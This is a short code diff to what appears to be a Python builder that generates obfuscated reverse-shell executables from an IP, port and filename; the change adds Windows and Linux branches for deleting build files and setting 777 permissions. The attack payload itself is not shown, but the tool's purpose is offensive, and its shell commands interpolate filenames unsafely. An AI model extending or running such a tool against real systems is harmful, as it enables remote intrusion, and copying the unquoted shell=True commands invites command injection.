@@ -2,6 +2,7 @@ import os
 import sys
 import base64
 import subprocess
+import platform
 
 def create_file(ip, port, filename):
     while filename == 'RevShell.py':
@@ -39,12 +40,17 @@ if __name__ == '__main__':
     build_exe(filename)
 
     # Remove unnecessary files	
-    cmd = f"rm -rf {filename}Obf.spec"
-    subprocess.call(cmd, shell=True)
-    cmd = f"rm -rf {filename}"
-    subprocess.call(cmd, shell=True)
-
-    # Granting Permissions	
-    cmd = f"chmod +777 {filename}Obf.py"
-    subprocess.call(cmd, shell=True)
-    
+    if platform.system() == 'Windows':
+        cmd = f"del {filename}Obf.spec"
+        subprocess.call(cmd, shell=True)
+        cmd = f"del {filename}"
+        subprocess.call(cmd, shell=True)
+    else:
+        cmd = f"rm -rf {filename}Obf.spec"
+        subprocess.call(cmd, shell=True)
+        cmd = f"rm -rf {filename}"
+        subprocess.call(cmd, shell=True)
+        # Granting Permissions	
+        if platform.system() == 'Linux':
+            cmd = f"chmod +777 {filename}Obf.py"
+            subprocess.call(cmd, shell=True)
